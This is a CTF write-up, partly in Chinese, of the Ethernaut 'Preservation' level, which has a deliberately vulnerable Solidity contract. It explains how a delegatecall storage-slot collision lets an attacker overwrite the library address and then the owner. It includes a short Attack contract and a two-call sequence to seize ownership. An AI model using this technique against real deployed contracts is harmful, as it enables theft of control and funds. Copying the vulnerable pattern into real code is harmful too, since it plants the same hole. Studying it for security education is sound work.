# Preservation

> This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
>
> The goal of this level is for you to claim ownership of the instance you are given.

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

## 攻击思路

当前合约使用delegatecall时只会使用代理调用合约的代码逻辑，不能修改代理调用合约的变量。代理调用合约寻找变量时会按照代理调用合约变量所在的插槽寻找当前合约插槽中的变量。

## 攻击流程

首先调用Preservation合约的setFirstTime函数，函数参数为Attack合约的地址。然后再调用Preservation合约的setFirstTime函数，函数参数为：我的账户地址。

```solidity
contract Attack {
    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint _time) public{
       owner = address(_time);
    }
}

```

As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.